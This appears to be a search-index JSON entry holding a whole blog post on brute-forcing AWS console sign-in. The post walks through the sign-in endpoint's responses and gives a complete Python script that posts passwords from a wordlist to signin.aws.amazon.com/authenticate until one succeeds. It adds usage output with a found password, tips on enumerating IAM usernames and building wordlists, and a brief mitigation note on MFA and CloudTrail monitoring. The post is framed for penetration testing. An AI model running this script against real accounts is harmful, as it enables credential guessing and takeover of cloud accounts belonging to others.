[ { "title": "How to brutefore AWS console sign-in", "url": "/blog/posts/brute-force-aws-console/", "categories": "Reseach, Cloud", "tags": "AWS", "date": "2021-09-15 22:34:00 +0700", "snippet": "IntroductionI saw some vendors have a detection rule about AWS Console brute force login and I was curious if there any AWS console brute force tool. So I start google but found nothing and I think there should be a way to brute force.How does console sign in work?When you click “Sign in” the console will send login data to https://signin.aws.amazon.com/authenticate and return a responseif the user enable MFA:{&quot;state&quot;:&quot;SUCCESS&quot;,&quot;properties&quot;:{&quot;result&quot;:&quot;MFA&quot;,&quot;mfaType&quot;:&quot;SW&quot;,&quot;header&quot;:&quot;Multi-factor Authentication&quot;,&quot;cancelLink&quot;:&quot;https://console.aws.amazon.com/console/home?fromtb\\u003dtrue\\u0026hashArgs\\u003d%23\\u0026state\\u003dhashArgsFromTB_us-east-1_4301e3df13c998fe&quot;,&quot;text&quot;:&quot;Enter an MFA code to complete sign-in.&quot;}}Login success:{&quot;state&quot;:&quot;SUCCESS&quot;,&quot;properties&quot;:{&quot;result&quot;:&quot;SUCCESS&quot;,&quot;redirectUrl&quot;:&quot;https://console.aws.amazon.com/console/home?code\\u003RUYiLCJlbmMiOiJ.....................................................YXgvJagvR8sF7w&quot;}}Incorrect username/password:{&quot;state&quot;:&quot;FAIL&quot;,&quot;properties&quot;:{&quot;result&quot;:&quot;FAILURE&quot;,&quot;text&quot;:&quot;Your authentication information is incorrect. Please try again.&quot;}}Missing some header:There seems to be a problem with your session. Or you are trying to access an AWS region that is not enabled for your account. &amp;lt;br /&amp;gt; If the problem persists try clearing your browser cookies or &amp;lt;a href=&quot;https://console.aws.amazon.com/iam/home?region=us-east-1&quot; target=&quot;_blank&quot;&amp;gt;sign in into the US East region&amp;lt;/a&amp;gt;.We apologize for the inconvenience.&amp;lt;br /&amp;gt;Missing some POST data :{&quot;state&quot;:&quot;FAIL&quot;,&quot;properties&quot;:{&quot;Message&quot;:&quot;Invalid request&quot;,&quot;Title&quot;:&quot;Bad Request&quot;,&quot;header&quot;:&quot;Bad Request&quot;,&quot;text&quot;:&quot;Invalid request&quot;}}So I remove unnecessary parameters the request will look like this :import requestsheaders = { &#39;Referer&#39;: &#39;https://signin.aws.amazon.com/oauth?client_id=arn%3Aaws%3Asignin%3A%3A%3Aconsole%2Fcanvas&amp;amp;code_challenge=HX2l8ZYWg_5-bz_ed-RChnM-GNqJFbWBiDBbtq1-HVQ&amp;amp;code_challenge_method=SHA-256&amp;amp;response_type=code&amp;amp;redirect_uri=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Ffromtb%3Dtrue%26hashArgs%3D%2523%26isauthcode%3Dtrue%26state%3DhashArgsFromTB_us-east-1_5674597973dd3cd0&amp;amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIFTWCIdWxMlnFxwHYxlpNxADKYyFjHxvuQqbiITcIZguAiB3o%2FsGsv9UbgQWi8UWH5r%2FgBHNK4%2FIaYM0brhqI%2BcpzyqTAgiD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAEaDDM1ODgyMTg4MDU2NSIMAtX%2BUfkVugJIEPKoKucBprpcJ0aOyAwP%2FHCPbyTIR1HkK%2F1XdC2dh2cdoPBpkSu%2FXgSLjtuRat4ZoPpIN9PtFCU8zYVhWhf%2BMRThkEDK1tUx8zwjPoE%2B%2BfwkBhBNXGmeptTDfprZ7LosegbiJe86zT8o3VOv4%2FE0tmJHcnSrsbEhM87AikUQvobKY6Lr4JlqU7MM3uuU6pxf7Vz1sagypCfcj%2FSKPlOqsFzmGyFpd9W4KNN%2BWceq9rGLmvHUbKOnN64I73uxWVH%2Bsj10CKgCfw060zjKHfZj41KcNvAazr7HyjT8Qmj1AjsmVw12hc4kobOh6zF8MM6G6oYGOpABiohVmFhrhpvVbITOoSePH7jdiC4my%2B60vDPkj5Av4Euz2Jdb2svTXMRXH82CQkhBl9EhflGz%2BMEp3n2AeJ4ySIajogQPrN0AqGDTQVxxhjcQ24%2F6ueSUC0MsL9irM2tt2Hm%2BHLsZ9zIFF7wSCWtBVVGJsYbcCL659kAWrWuFhXRiofBN7cRvyUZSqO83J2zA&amp;amp;X-Amz-Date=20210629T022227Z&amp;amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=ASIAVHC3TML2YHA5VWS4%2F20210629%2Fus-east-1%2Fsignin%2Faws4_request&amp;amp;X-Amz-SignedHeaders=host&amp;amp;X-Amz-Signature=11d78bf1043164b982b04e82f0c33a5866bc35cc70e53da3c6d8353ba525719d&#39;,}data = { &#39;action&#39;: &#39;iam-user-authentication&#39;, &#39;account&#39;: &#39;123456789012&#39;, &#39;username&#39;: &#39;console_user&#39;, &#39;password&#39;: &#39;password&#39;, &#39;client_id&#39;: &#39;arn:aws:signin:::console/canvas&#39;, &#39;redirect_uri&#39;: &#39;https://console.aws.amazon.com/console/home&#39;,}response = requests.post(&#39;https://signin.aws.amazon.com/authenticate&#39;, headers=headers, cookies=cookies, data=data)The referer header has an AWS credential that got from the sign-in page but you can just remove GET parameters the request still works. so the final playload will look like this:import requestsheaders = { &#39;Referer&#39;: &#39;https://signin.aws.amazon.com&#39;,}data = { &#39;action&#39;: &#39;iam-user-authentication&#39;, &#39;account&#39;: &#39;123456789012&#39;, &#39;username&#39;: &#39;console_user&#39;, &#39;password&#39;: &#39;password&#39;, &#39;client_id&#39;: &#39;arn:aws:signin:::console/canvas&#39;, &#39;redirect_uri&#39;: &#39;https://console.aws.amazon.com/console/home&#39;,}response = requests.post(&#39;https://signin.aws.amazon.com/authenticate&#39;, headers=headers, data=data)print(response.text)Where to find usernames?You can use a Rhino Security Labs’ research Using AWS Account ID’s for IAM User or Pacu module iam__enum_users to enumerate usernames.Brute force passwordRequirements AWS account id Console username Password wordlistPrepare a wordlistif you have a permission iam:GetAccountPasswordPolicy or you already know the target account’s password policy you should follow that policybut if you don’t I recommend using the default policy as a guideline.The default user password policy: Minimum password length is 8 characters Include a minimum of three of the following mix of character types: uppercase, lowercase, numbers, and ! @ # $ % ^ &amp;amp; * ( ) _ + - = [ ] { } ’ Must not be identical to your AWS account name or email addressIf you want to make sure the wordlist cover all password as possible you can use thisThe weakest possible password policy: Minimum password length is 6 charactersBrute force script#!/usr/bin/python3import argparseimport requestsheaders = { &#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&#39;, &#39;referer&#39;: &#39;https://signin.aws.amazon.com&#39;,}data = { &#39;action&#39;: &#39;iam-user-authentication&#39;, &#39;account&#39;: &#39;123456789012&#39;, &#39;username&#39;: &#39;console_user&#39;, &#39;password&#39;: &#39;password&#39;, &#39;client_id&#39;: &#39;arn:aws:signin:::console/canvas&#39;, &#39;redirect_uri&#39;: &#39;https://console.aws.amazon.com/console/home&#39;,}requests.urllib3.disable_warnings()parser = argparse.ArgumentParser()parser.add_argument(&#39;--account-id&#39;,&#39;-id&#39;, required=True, default=False, metavar=&#39;account_id&#39;, type=str)parser.add_argument(&#39;--username&#39;,&#39;-u&#39;, required=True, default=False, metavar=&#39;username&#39;, type=str)parser.add_argument(&#39;--wordlist&#39;,&#39;-w&#39;, required=True, default=False, metavar=&#39;file_path&#39;, type=str)args = parser.parse_args()if __name__ == &#39;__main__&#39;: data[&#39;account&#39;] = args.account_id data[&#39;username&#39;] = args.username passwords = open(args.wordlist).read().splitlines() for password in passwords: data[&#39;password&#39;] = password response = requests.post( &#39;https://signin.aws.amazon.com/authenticate&#39;, headers=headers, data=data, verify=False ) if &#39;&quot;result&quot;:&quot;SUCCESS&quot;&#39; in response.text: print(response.text) print(&quot;=&quot;*20) print(&quot;Passwrod: &quot;, password) breakUsage:./poc.py -id 0123456789012 -u console_user -w passwords.txt{&quot;state&quot;:&quot;SUCCESS&quot;,&quot;properties&quot;:{&quot;result&quot;:&quot;SUCCESS&quot;,&quot;redirectUrl&quot;:&quot;https://console.aws.amazon.com/console/home?code\\ueyJ6a........................0EqLmrg&quot;}}====================Passwrod: Brut3f0r3_P@ssw0rdMitigationI recommend enabling MFA for all console users. You can also monitor Cloudtrail log eventName: ConsoleLogin if you see a lot fail login attempts in a short period and see login success from the same IP maybe someone got into your account.ConclusionThis technique combined with a Rhino Security Labs’ research1 could be useful when you perform penetration testing AWS accounts and demonstrate how important MFA and strong password policy are necessary to make your AWS account secure." } ]
